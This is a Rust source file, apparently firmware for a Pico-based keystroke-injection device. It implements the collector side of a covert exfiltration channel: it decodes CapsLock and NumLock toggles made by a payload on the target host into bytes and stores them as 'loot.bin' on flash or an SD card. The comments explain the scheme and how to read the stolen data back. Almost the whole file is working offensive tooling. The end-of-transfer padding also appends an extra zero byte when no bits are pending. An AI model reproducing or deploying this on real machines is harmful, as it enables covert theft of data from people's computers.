//! exfil.rs — LED-based data exfiltration monitor (Step 9)
//!
//! Mirrors monitor_led_changes() from duckyinpython.py exactly.
//!
//! How it works:
//!   The target host's keyboard LED state (CapsLock, NumLock) is used as a
//!   covert 1-bit-per-toggle channel. The Pico watches LED state changes
//!   reported by the host via HID SET_REPORT and decodes them into bytes:
//!
//!     CapsLock toggle → bit 0
//!     NumLock  toggle → bit 1
//!     8 bits collected → write one byte to loot.bin
//!     ScrollLock toggle → stop exfil (sentinel)
//!
//!   A payload script enables exfil mode by setting $_EXFIL_MODE_ENABLED = TRUE.
//!   The LED stays solid on during exfil ($_EXFIL_LEDS_ENABLED).
//!
//! Loot storage:
//!   Written to loot.bin on flash (always) and SD card (if present).
//!   The file is opened in append mode so multiple exfil runs accumulate.
//!
//! Reading loot:
//!   Use the serial management interface:  get loot.bin  (hex-dumps binary)
//!   Or retrieve the SD card and read loot.bin directly on your computer.

use defmt::*;
use embassy_time::{Duration, Timer};
use embassy_sync::{
    blocking_mutex::raw::CriticalSectionRawMutex,
    signal::Signal,
};

use crate::usb::hid::LED_STATE;
use crate::hardware::EXFIL_LEDS_ENABLED;
use crate::ducky;

// ---------------------------------------------------------------------------
// Exfil control signals
// ---------------------------------------------------------------------------

/// Set TRUE by DuckyScript when $_EXFIL_MODE_ENABLED = TRUE.
/// Exfil task watches this to start/stop collection.
pub static EXFIL_MODE_ENABLED: Signal<CriticalSectionRawMutex, bool> = Signal::new();

// ---------------------------------------------------------------------------
// Exfil task
// ---------------------------------------------------------------------------
//
// Runs as a spawned embassy task alongside the LED, button, and USB tasks.
// Polls the HID LED state at 1ms intervals when active — matches the
// asyncio.sleep(0.001) polling rate from duckyinpython.py.

#[embassy_executor::task]
pub async fn exfil_task() {
    info!("exfil_task: started");

    loop {
        // Wait until exfil mode is enabled by a script
        let enabled = EXFIL_MODE_ENABLED.wait().await;
        if !enabled { continue; }

        info!("[exfil] mode enabled — collecting LED bits");
        EXFIL_LEDS_ENABLED.signal(true);  // hold LED solid on

        let mut bit_list: heapless::Vec<u8, 8> = heapless::Vec::new();
        let mut loot_bytes: heapless::Vec<u8, 512> = heapless::Vec::new();

        let mut last_caps_state:   bool;
        let mut last_num_state:    bool;
        let last_scroll_state: bool;

        // Read initial LED state
        {
            let leds = *LED_STATE.lock().await;
            last_caps_state   = leds & 0x02 != 0;
            last_num_state    = leds & 0x01 != 0;
            last_scroll_state = leds & 0x04 != 0;
        }

        'collect: loop {
            // Check if exfil was cancelled by the script
            if EXFIL_MODE_ENABLED.signaled() {
                let still_on = EXFIL_MODE_ENABLED.wait().await;
                if !still_on {
                    info!("[exfil] mode disabled by script");
                    break 'collect;
                }
            }

            // Read current LED state
            let leds = *LED_STATE.lock().await;
            let caps_state   = leds & 0x02 != 0;
            let num_state    = leds & 0x01 != 0;
            let scroll_state = leds & 0x04 != 0;

            // CapsLock toggle → bit 0
            if caps_state != last_caps_state {
                let _ = bit_list.push(0);
                last_caps_state = caps_state;
                info!("[exfil] CapsLock → bit 0 (total bits: {})", bit_list.len());
            }

            // NumLock toggle → bit 1
            if num_state != last_num_state {
                let _ = bit_list.push(1);
                last_num_state = num_state;
                info!("[exfil] NumLock  → bit 1 (total bits: {})", bit_list.len());
            }

            // 8 bits collected → pack into one byte
            if bit_list.len() == 8 {
                let mut byte: u8 = 0;
                for &b in bit_list.iter() {
                    byte = (byte << 1) | b;
                }
                let _ = loot_bytes.push(byte);
                bit_list.clear();
                info!("[exfil] byte 0x{:02X} collected ({} bytes total)", byte, loot_bytes.len());

                // Flush to filesystem every 256 bytes to avoid losing data on power loss
                if loot_bytes.len() >= 256 {
                    flush_loot(&loot_bytes).await;
                    loot_bytes.clear();
                }
            }

            // ScrollLock toggle → sentinel, stop collection
            if scroll_state != last_scroll_state {
                info!("[exfil] ScrollLock sentinel — exfil complete");
                // Flush remaining bytes
                if !loot_bytes.is_empty() || !bit_list.is_empty() {
                    // Pad incomplete byte with zeros
                    while bit_list.len() < 8 { let _ = bit_list.push(0); }
                    if bit_list.len() == 8 {
                        let mut byte: u8 = 0;
                        for &b in bit_list.iter() { byte = (byte << 1) | b; }
                        let _ = loot_bytes.push(byte);
                    }
                    flush_loot(&loot_bytes).await;
                }
                EXFIL_LEDS_ENABLED.signal(false);  // release LED
                break 'collect;
            }

            // Poll at 1ms — same as asyncio.sleep(0.001)
            Timer::after(Duration::from_millis(1)).await;
        }

        info!("[exfil] collection stopped");
    }
}

// ---------------------------------------------------------------------------
// Loot flush — write collected bytes to loot.bin
// ---------------------------------------------------------------------------
//
// Appends to loot.bin on flash (always) and SD (if present).
// loot.bin existence on flash also controls the boot.py USB drive visibility
// logic — we mirror that here via the filesystem layer.

async fn flush_loot(data: &[u8]) {
    if data.is_empty() { return; }
    info!("[exfil] flushing {} bytes to loot.bin", data.len());
    let fs = crate::fs::FlashFs::new();
    let existing_len = fs.read_file_async("loot.bin").await.unwrap_or(0);
    let mut combined: heapless::Vec<u8, 4096> = heapless::Vec::new();
    if existing_len > 0 {
        let _ = combined.extend_from_slice(unsafe { &crate::fs::FLASH_DATA_BUF[..existing_len] });
    }
    let _ = combined.extend_from_slice(data);
    match fs.write_file_async("loot.bin", &combined).await {
        Ok(())  => info!("[exfil] loot.bin updated ({} bytes total)", combined.len()),
        Err(e)  => warn!("[exfil] loot.bin write failed: {}", e),
    }
}
